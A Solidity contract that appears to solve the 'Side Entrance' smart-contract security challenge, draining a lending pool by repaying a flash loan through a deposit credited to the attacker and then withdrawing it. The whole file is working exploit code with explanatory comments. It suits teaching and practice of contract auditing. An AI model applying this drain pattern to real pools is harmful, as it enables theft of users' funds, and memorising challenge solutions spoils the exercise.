pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker {
    SideEntranceLenderPool private pool;
    address recoveryAddress;

    constructor(address _pool, address _recoveryAddress) {
        pool = SideEntranceLenderPool(_pool);
        recoveryAddress = _recoveryAddress;
    }

    fallback() payable external {}

    receive() payable external {}

    //@dev - we make a flashloan to the pool that will make a callback to this contract's execute function
    // after the flashloan, we withdraw the funds and send them to the recovery address
    function attack() external returns (bool) {

        uint256 amountToSteal = address(pool).balance;

        pool.flashLoan(amountToSteal);

        pool.withdraw();

        payable(recoveryAddress).transfer(address(this).balance);

        return true;

    }

    // @dev - this function is called by the pool after the flashloan. Here, we deposit the funds back into the pool
    // in order to:
    // 1. do not change the pool's balance so the pool won't revert the transaction
    // 2. deposit the funds in the name of this contract in order to withdraw them later
    function execute() external payable {

        pool.deposit{value: msg.value}();

    }
}